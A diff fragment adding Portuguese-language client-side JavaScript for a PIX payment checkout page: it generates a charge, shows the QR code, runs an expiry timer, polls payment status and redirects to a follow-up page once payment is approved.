+            const response = await fetch('/api/pix', {
+                method: 'POST',
+
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+
+                body: JSON.stringify(payload)
+            });
+
+            const result =
+                await parseApiResponse(response);
+
+            if (result.success !== true) {
+                throw new Error(
+                    result.error ||
+                    result.message ||
+                    'Não foi possível gerar o PIX'
+                );
+            }
+
+            const transactionId =
+                result.transactionId ||
+                result.transaction_id ||
+                result.id;
+
+            if (!transactionId) {
+                throw new Error(
+                    'O gateway não retornou transactionId'
+                );
+            }
+
+            const qrCodeImage =
+                result.qrCodeImage || '';
+
+            const pixCopyPaste =
+                result.pixCopyPaste || '';
+
+            if (!qrCodeImage && !pixCopyPaste) {
+                throw new Error(
+                    'O gateway não retornou dados do PIX'
+                );
+            }
+
+            stopStatusCheck();
+            stopPixTimer();
+
+            currentTransactionId =
+                String(transactionId);
+
+            currentReference = String(
+                result.reference || transactionId
+            );
+
+            paymentApproved = false;
+
+            LeadData.update({
+                transaction_id: currentTransactionId,
+                reference: currentReference,
+                pix_generated: true,
+                pix_timestamp: Date.now(),
+                payment_confirmed: false
+            });
+
+            const qrImage = $('pixQrImage');
+            const copyInput = $('pixCopyPaste');
+
+            if (qrImage) {
+                if (qrCodeImage) {
+                    qrImage.src = qrCodeImage;
+                    qrImage.hidden = false;
+                } else {
+                    qrImage.removeAttribute('src');
+                    qrImage.hidden = true;
+                }
+            }
+
+            if (copyInput) {
+                copyInput.value = pixCopyPaste;
+            }
+
+            openPixModal();
+            startPixTimer();
+            startStatusCheck();
+
+            trackInitiateCheckout();
+
+            console.log(
+                '[PIX] Gerado:',
+                currentTransactionId
+            );
+
+        } catch (error) {
+            console.error(
+                '[PIX] Erro ao gerar:',
+                error
+            );
+
+            alert(
+                'Erro ao gerar o Pix: ' +
+                (error.message || 'Tente novamente')
+            );
+
+        } finally {
+            generatingPix = false;
+
+            if (btn) {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+            }
+        }
+    };
+
+    // ─── MODAL PIX ───
+
+    function openPixModal() {
+        const overlay = $('pixOverlay');
+
+        if (overlay) {
+            overlay.classList.add('active');
+        }
+
+        document.body.style.overflow = 'hidden';
+    }
+
+    window.closePixModal = function () {
+        const overlay = $('pixOverlay');
+
+        if (overlay) {
+            overlay.classList.remove('active');
+        }
+
+        document.body.style.overflow = '';
+    };
+
+    const pixOverlay = $('pixOverlay');
+
+    if (pixOverlay) {
+        pixOverlay.addEventListener(
+            'click',
+            function (event) {
+                if (event.target === this) {
+                    window.closePixModal();
+                }
+            }
+        );
+    }
+
+    // ─── COPIAR PIX ───
+
+    window.copyPixCode = async function () {
+        const input = $('pixCopyPaste');
+
+        if (!input || !input.value) {
+            return;
+        }
+
+        const code = input.value;
+
+        try {
+            if (
+                navigator.clipboard &&
+                navigator.clipboard.writeText
+            ) {
+                await navigator.clipboard.writeText(code);
+            } else {
+                fallbackCopy();
+            }
+
+            showCopied();
+
+        } catch (error) {
+            try {
+                fallbackCopy();
+                showCopied();
+            } catch (fallbackError) {
+                console.error(
+                    '[PIX] Erro ao copiar:',
+                    fallbackError
+                );
+
+                alert(
+                    'Não foi possível copiar o código PIX.'
+                );
+            }
+        }
+    };
+
+    function fallbackCopy() {
+        const input = $('pixCopyPaste');
+
+        if (!input) {
+            throw new Error(
+                'Campo do código PIX não encontrado'
+            );
+        }
+
+        input.focus();
+        input.select();
+        input.setSelectionRange(0, input.value.length);
+
+        const copied = document.execCommand('copy');
+
+        if (!copied) {
+            throw new Error(
+                'O navegador não permitiu copiar'
+            );
+        }
+    }
+
+    function showCopied() {
+        const btn = $('copyBtn');
+
+        if (!btn) return;
+
+        btn.textContent = '✓ Copiado!';
+        btn.classList.add('copied');
+
+        setTimeout(function () {
+            btn.textContent = 'Copiar';
+            btn.classList.remove('copied');
+        }, 3000);
+    }
+
+    // ─── TIMER PIX ───
+
+    function startPixTimer() {
+        stopPixTimer();
+
+        pixTimerSeconds = 30 * 60;
+
+        updatePixTimer();
+
+        pixTimerInterval = setInterval(
+            updatePixTimer,
+            1000
+        );
+    }
+
+    function stopPixTimer() {
+        if (pixTimerInterval !== null) {
+            clearInterval(pixTimerInterval);
+            pixTimerInterval = null;
+        }
+    }
+
+    function updatePixTimer() {
+        const timer = $('pixTimer');
+
+        const minutes =
+            Math.floor(pixTimerSeconds / 60);
+
+        const seconds =
+            pixTimerSeconds % 60;
+
+        if (timer) {
+            timer.textContent =
+                String(minutes).padStart(2, '0') +
+                ':' +
+                String(seconds).padStart(2, '0');
+        }
+
+        if (pixTimerSeconds > 0) {
+            pixTimerSeconds--;
+            return;
+        }
+
+        if (timer) {
+            timer.textContent = 'EXPIRADO';
+        }
+
+        stopPixTimer();
+        stopStatusCheck();
+    }
+
+    // ─── CONSULTA DE STATUS ───
+
+    function startStatusCheck() {
+        stopStatusCheck();
+
+        if (!currentTransactionId) {
+            console.warn(
+                '[Status] Nenhuma transação definida'
+            );
+            return;
+        }
+
+        statusCheckInterval = setInterval(
+            checkPaymentStatus,
+            4000
+        );
+
+        statusCheckTimeout = setTimeout(
+            checkPaymentStatus,
+            3000
+        );
+    }
+
+    function stopStatusCheck() {
+        if (statusCheckInterval !== null) {
+            clearInterval(statusCheckInterval);
+            statusCheckInterval = null;
+        }
+
+        if (statusCheckTimeout !== null) {
+            clearTimeout(statusCheckTimeout);
+            statusCheckTimeout = null;
+        }
+    }
+
+    async function checkPaymentStatus() {
+        if (
+            !currentTransactionId ||
+            checkingStatus ||
+            paymentApproved
+        ) {
+            return;
+        }
+
+        checkingStatus = true;
+
+        const requestedTransactionId =
+            currentTransactionId;
+
+        try {
+            const url = new URL(
+                '/api/status',
+                window.location.href
+            );
+
+            url.searchParams.set(
+                'id',
+                requestedTransactionId
+            );
+
+            if (currentReference) {
+                url.searchParams.set(
+                    'reference',
+                    currentReference
+                );
+            }
+
+            const response = await fetch(
+                url.toString(),
+                {
+                    method: 'GET',
+
+                    headers: {
+                        'Accept': 'application/json'
+                    },
+
+                    cache: 'no-store'
+                }
+            );
+
+            const result =
+                await parseApiResponse(response);
+
+            if (
+                requestedTransactionId !==
+                currentTransactionId
+            ) {
+                return;
+            }
+
+            const status = String(
+                result.status ||
+                result.payment_status ||
+                result.situation ||
+                result.data?.status ||
+                ''
+            ).toUpperCase().trim();
+
+            console.log(
+                '[Status]',
+                status,
+                result
+            );
+
+            const approvedStatuses = [
+                'APPROVED',
+                'PAID',
+                'CONFIRMED'
+            ];
+
+            if (approvedStatuses.includes(status)) {
+                showPaymentApproved();
+                return;
+            }
+
+            const failedStatuses = [
+                'FAILED',
+                'CANCELED',
+                'CANCELLED',
+                'EXPIRED',
+                'REFUNDED',
+                'REJECTED'
+            ];
+
+            if (failedStatuses.includes(status)) {
+                stopStatusCheck();
+                stopPixTimer();
+
+                setText(
+                    'pixStatusText',
+                    'Pagamento ' + status.toLowerCase()
+                );
+
+                setText(
+                    'pixStatusDesc',
+                    'Esta cobrança não está mais disponível.'
+                );
+            }
+
+        } catch (error) {
+            console.error(
+                '[Status] Erro:',
+                error.message || error
+            );
+
+        } finally {
+            checkingStatus = false;
+        }
+    }
+
+    // ─── PAGAMENTO APROVADO ───
+
+    function showPaymentApproved() {
+        if (paymentApproved) {
+            return;
+        }
+
+        paymentApproved = true;
+
+        stopStatusCheck();
+        stopPixTimer();
+
+        const statusIcon = $('pixStatusIcon');
+
+        if (statusIcon) {
+            statusIcon.className = 'ps-icon paid';
+
+            statusIcon.innerHTML = `
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            `;
+        }
+
+        setClass(
+            'pixStatusDot',
+            'pix-status-dot paid'
+        );
+
+        setText(
+            'pixStatusText',
+            'Pagamento confirmado!'
+        );
+
+        setText(
+            'pixStatusDesc',
+            'Seu pedido está sendo preparado'
+        );
+
+        const pixStatus = $('pixStatus');
+
+        if (pixStatus) {
+            pixStatus.style.background =
+                'rgba(52,199,89,0.08)';
+        }
+
+        LeadData.update({
+            payment_confirmed: true,
+            payment_timestamp: Date.now(),
+            transaction_id: currentTransactionId
+        });
+
+        trackPurchase(currentTransactionId);
+
+        console.log(
+            '[PIX] Pagamento aprovado:',
+            currentTransactionId
+        );
+
+        setTimeout(function () {
+            const url = new URL(
+                '../up0/',
+                window.location.href
+            );
+
+            new URLSearchParams(
+                window.location.search
+            ).forEach(function (value, key) {
+                url.searchParams.set(key, value);
+            });
+
+            window.location.href = url.toString();
+
+        }, 2500);
+    }
+
+    // ─── MODO DE TESTE DE REDIRECIONAMENTO ───
+    // Não registra compra nem aprovação de pagamento.
+
+    if (isTestMode && params.get('skip') === 'pago') {
+        const url = new URL(
+            'obrigado.html',
+            window.location.href
+        );
+
+        new URLSearchParams(
+            window.location.search
+        ).forEach(function (value, key) {
+            url.searchParams.set(key, value);
+        });
+
+        window.location.href = url.toString();
+    }
+
+    // ─── EXPOSIÇÃO PARA DEBUG ───
+
+    window.AppCheckout = {
+        generatePix: window.generatePix,
+        closePixModal: window.closePixModal,
+        copyPixCode: window.copyPixCode,
+        toggleFaq: window.toggleFaq,
+        checkPaymentStatus,
+        startStatusCheck,
+        stopStatusCheck,
+        startPixTimer,
+        stopPixTimer,
+        getTransactionId: () => currentTransactionId
+    };
+
+    console.log(
+        '[Checkout] Script inicializado com sucesso'
+    );
+
+})();
+</script>
+
+</body>
+</html>
